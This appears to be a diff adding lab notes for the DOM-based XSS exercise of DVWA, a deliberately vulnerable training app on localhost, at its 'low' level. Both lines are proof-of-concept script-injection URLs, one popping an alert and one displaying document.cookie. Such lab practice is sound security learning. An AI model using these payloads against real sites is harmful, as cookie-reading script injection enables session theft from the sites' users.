@@ -1,0 +1,3 @@
+[LOW]
+http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(1)%3C/script%3E
+http://127.0.0.1/dvwa/vulnerabilities/xss_d/#default=<script>alert(document.cookie)</script>
